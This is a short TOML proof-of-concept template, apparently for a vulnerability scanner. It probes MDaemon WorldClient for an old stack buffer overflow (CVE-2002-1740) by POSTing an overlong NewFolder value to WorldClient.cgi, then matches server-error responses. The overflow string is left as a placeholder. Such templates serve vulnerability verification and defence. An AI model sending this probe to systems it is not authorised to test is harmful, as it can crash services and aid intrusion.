[info]
author = "ave"
description = "通过向 WorldClient.cgi 的 NewFolder 参数提交超长字符串，触发栈缓冲区溢出，验证目标是否受影响。攻击者需具备本地访问权限，以 POST 方式发送超长文件夹名称即可触发溢出条件。"
id = "POC-AVE-2002-0668"
name = "MDaemon WorldClient 文件夹创建缓冲区溢出 PoC"
severity = "low"
tags = ["ave-2002-0668"]
vuln_id = [
    "CVE-2002-1740",
    "AVE-2002-0668",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/WorldClient.cgi"
protocol = "http"

[poc.requests.body]
content = "NewFolder={{payload}}"
type = "form"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Server Error",
    "Internal Server Error",
]
